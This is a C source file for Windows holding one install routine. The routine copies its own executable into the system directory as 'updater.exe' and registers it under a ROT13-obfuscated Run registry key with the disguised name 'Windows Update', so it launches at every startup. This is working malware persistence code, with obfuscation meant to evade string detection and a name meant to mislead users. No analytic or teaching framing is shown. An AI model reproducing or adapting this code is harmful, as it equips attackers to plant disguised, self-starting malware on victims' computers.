#include "data_globals.h"
#include <windows.h>
#include <string.h>

#pragma optimize("", off)
uint32_t _Install(void)
{
    volatile struct _LocalCtx {
        char ModPath[256];
        char SPath[256];
        char TranGU[110];
        DWORD cbData;
        HKEY hKey;
    } ctx;

    // No explicit initializations needed; variables will be assigned later.

    GetModuleFileNameA(NULL, ctx.ModPath, sizeof(ctx.ModPath));
    GetSystemDirectoryA(ctx.SPath, sizeof(ctx.SPath));
    strcat(ctx.SPath, "\\updater.exe");
    CopyFileA(ctx.ModPath, ctx.SPath, FALSE);

    memset(ctx.TranGU, 0, sizeof(ctx.TranGU));
    _CiphStr(ctx.TranGU, "FBSGJNER\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha");

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, ctx.TranGU, 0, KEY_WRITE, &ctx.hKey);
    ctx.cbData = strlen(ctx.SPath);
    RegSetValueExA(ctx.hKey, "Windows Update", 0, REG_SZ, ctx.SPath, ctx.cbData);
    RegCloseKey(ctx.hKey);

    return 0;
}
#pragma optimize("", on)
